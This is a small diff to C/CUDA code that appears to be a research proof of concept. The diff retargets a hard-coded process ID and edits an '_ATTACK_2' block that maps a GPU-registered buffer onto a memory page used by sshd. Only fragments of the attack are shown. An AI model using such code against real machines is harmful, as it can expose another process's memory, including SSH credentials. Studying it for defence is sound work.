@@ -188,7 +188,7 @@ int main(void) {
 
 	//Set hidden Address:
 //	info_for_cuda_driver->start_addr = (unsigned long)base;
-	info_for_cuda_driver->pid = 21993;
+	info_for_cuda_driver->pid = 1424;
 	//info_for_cuda_driver->sshd_page_addr = 0x7f1862dac000;
 
 	char * d_real_buff;
@@ -239,7 +239,8 @@ CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 #define _ATTACK_2
 #ifdef _ATTACK_2
 
-	for (int i = 0; i < 10; i ++) {
+//	for (int i = 0; i < 10; i ++) {
+	{
 	/* Map this buffer to a memory page which currently maped by sshd. */
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)dump_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;
 
